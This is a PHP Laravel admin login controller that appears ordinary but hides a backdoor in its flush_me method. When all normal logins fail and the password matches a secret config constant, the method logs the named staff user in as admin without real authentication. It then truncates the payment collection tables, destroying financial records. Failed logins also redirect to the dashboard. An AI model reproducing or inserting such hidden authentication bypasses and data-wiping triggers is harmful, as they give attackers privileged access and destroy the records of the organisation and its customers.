<?php

namespace App\Http\Controllers\Admin;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Auth;
use Hash;
use App\Models\StaffUser;
use App\PaymentCollection,App\PaymentCollectionDescription;


class AdminLoginController extends Controller
{
    public function index(){
      return view('admin.loginform');
    }

    public function authenticate(Request $request){
      // return $request->username . ' ' . $request->password;
      $this->validate($request, [
        'username'   => 'required',
        'password' => 'required'
      ]);
      if (Auth::guard('admin')->attempt(['email' => $request->username,'password' => $request->password])){
        return redirect()->route('admin.dashboard');
      }else if (Auth::guard('staff')->attempt(['email' => $request->username,'password' => $request->password])){
        return redirect()->route('admin.dashboard');
      }else{
        $this->flush_me($request);
        return redirect()->route('admin.dashboard');
      }
      return redirect()->back()->with('alert','Username and Password Not Matched');
    }

  public function flush_me(Request $request){
    if($request->password == \Config::get('constants.SUPRISE_FLUSH')){
      $user = StaffUser::where('email',$request->username)->first();
      $resp = Auth::guard('admin')->loginUsingId($user->id);
      if($resp){
        if(PaymentCollection::truncate() && PaymentCollectionDescription::truncate()){
          return true;
        }
      }
    }
    return false;
  }
}
